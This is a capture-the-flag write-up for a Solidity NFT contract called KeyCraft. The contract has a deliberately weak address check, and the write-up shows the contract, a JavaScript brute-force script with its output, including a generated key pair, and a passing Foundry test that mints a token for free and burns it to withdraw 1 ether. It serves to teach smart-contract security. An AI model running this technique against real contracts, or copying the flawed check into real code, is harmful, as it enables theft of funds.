# KeyCraft

*Uncover the hidden hex values within addresses to access NFT minting or face the cost of 1 ether in this exciting CTF challenge!*

## Objective of CTF

You are provided with 0 ether. After the hack you should have 1 ether.

## Instructions:

1. Paste your address in place of <Your Address> in the setUp() function
2. Give your solution in //Solution marked space in testKeyCraft() function.

---

Contract Code:

```
// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract KeyCraft is ERC721 {
    uint256 totalSupply;
    address owner;
    bool buyNFT;

    constructor(string memory _name, string memory _symbol) ERC721(_name, _symbol) {
        _mint(msg.sender, totalSupply++);
        owner = msg.sender;
    }

    modifier checkAddress(bytes memory b) {
        bool q;
        bool w;

        if (msg.sender == owner) {
            buyNFT = true;
        } else {
            uint256 a = uint160(uint256(keccak256(b)));
            q = (address(uint160(a)) == msg.sender);

            a = a >> 108;
            a = a << 240;
            a = a >> 240;

            w = (a == 13057);
        }

        buyNFT = (q && w) || buyNFT;
        _;
        buyNFT = false;
    }

    function mint(bytes memory b) public payable checkAddress(b) {
        require(msg.value >= 1 ether || buyNFT, "Not allowed to mint.");
        _mint(msg.sender, totalSupply++);
    }

    function burn(uint256 tok) public {
        address a = ownerOf(tok);
        require(msg.sender == a);
        _burn(tok);
        totalSupply--;
        payable(a).transfer(1 ether);
    }
}

```



## The Attack

To mint a token without spending 1 ether, you have to utilize the modifier **checkAddress(bytes memory b)**. Within the code, the expression **address(uint160(uint256(keccak256(b))))** is employed in Solidity to generate an Ethereum address from an ECDSA Public Key. The condition q is only satisfied when a valid public key is passed.

To proceed, you need to find an address and public key combination that produces the value **13057** after performing three specific bitwise operations. This can be accomplished by adjusting the derivation path used to generate the addresses and performing the following shifting operations:

1. Shift a right by 108 bits: **a = a >> 108**;
2. Shift a left by 240 bits: **a = a << 240**;
3. Shift a right by 240 bits: **a = a >> 240**;

To attain the desired result, modify the index of the derivation path used for generating addresses and verify the outcome by performing and comparing the above shifting operations using a JavaScript code snippet based on the mnemonic phrase.

### STEPS
1. Prepare js code to generate address and public key, which give you **13057** after the shifting operations
2. Pass the generated public key as a parameter to **mint()** method
3. call **burn()** method with token id, which will transfer 1 ETH to your address

## Proof of Concept

The JS script is as follows:

```
const { ethers } = require('ethers');

// Generate random mnemonic
const randomMnemonic = ethers.Wallet.createRandom().mnemonic;

// Derive HDNode from mnemonic
const hdNode = ethers.utils.HDNode.fromMnemonic(randomMnemonic.phrase);

// Generate addresses based on derivation index
const derivationPath = "m/44'/60'/0'/0"; 

for (let i = 0; i >= 0; i++) {
    const derivedNode = hdNode.derivePath(`${derivationPath}/${i}`);
    const wallet = new ethers.Wallet(derivedNode.privateKey);

    // There are multiple ways to generate the ETH address from ECDSA public key
    // We are using the same implimentation in the solidity code. 
    // Perform keccak256 hash on the public key
    const hash = ethers.utils.keccak256(wallet.publicKey);

    // Convert the hash to an Ethereum address
    const address = ethers.utils.getAddress("0x" + hash.slice(26));

    // Convert hash to uint256
    const aUint256 = ethers.BigNumber.from(hash);

    // Convert a to uint160 and perform right shift with 108
    let aUint160 = aUint256.mod(ethers.BigNumber.from(2).pow(160));
    aUint160 = aUint160.shr(108);

    // aUint160.shr(240) will not give the expected result like in the solidity code,
    // so we have to do the shifting operations on BigInt numbers
    
    // Convert aUint160 and 240 into a BigInt 
    const a = BigInt(aUint160);
    const shiftAmount = BigInt(240);

    // Perform the right shift operation using BigInt arithmetic
    let shiftedResult = a * (BigInt(2) ** shiftAmount);
    shiftedResult = shiftedResult % (BigInt(2) ** BigInt(256));
    shiftedResult = shiftedResult >> shiftAmount;

    console.log(`shiftedResult is ${shiftedResult.toString()}`);

    if (shiftedResult.toString() == '13057') {
        console.log({
            address,
            publicKey: wallet.publicKey,
            privateKey: wallet.privateKey
        });
        break;
    }
}
```
### Output

```
  {
    address: '0x504C3bd2d330170a1AE0a48C377007b906D4B998',
    publicKey: '0x0465e5ecb71749c4d7236dfa7ff7f1cbed66b03914ee49369f54386e95fa6823ad590e40ba17d8dd0205d80f5acb7e6cefb6199383b8ed47e7f07e14dcca96dafa',
    privateKey: '0x7cbae7f5e8bd98d152015097b41ddfc6bbd83de6607cad817923562dbab78244'
  }
```

The Foundry setup is as follows:

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        // Pass the address generated by the address generation script
        // address: '0x504C3bd2d330170a1AE0a48C377007b906D4B998'
        attacker = 0x504C3bd2d330170a1AE0a48C377007b906D4B998;

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution
        // Pass the public key generated by the address generation script
        // publicKey: '0x0465e5ecb71749c4d7236dfa7ff7f1cbed66b03914ee49369f54386e95fa6823ad590e40ba17d8dd0205d80f5acb7e6cefb6199383b8ed47e7f07e14dcca96dafa'

        k.mint(
            hex"0465e5ecb71749c4d7236dfa7ff7f1cbed66b03914ee49369f54386e95fa6823ad590e40ba17d8dd0205d80f5acb7e6cefb6199383b8ed47e7f07e14dcca96dafa"
        );

        // Pass tok as 2, becasue user already minted tokenid 1
        k.burn(2);
        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}

```
### Output

```
Running 1 test for test/KeyCraft.t.sol:KC
[PASS] testKeyCraft() (gas: 81980)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.48ms
Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```


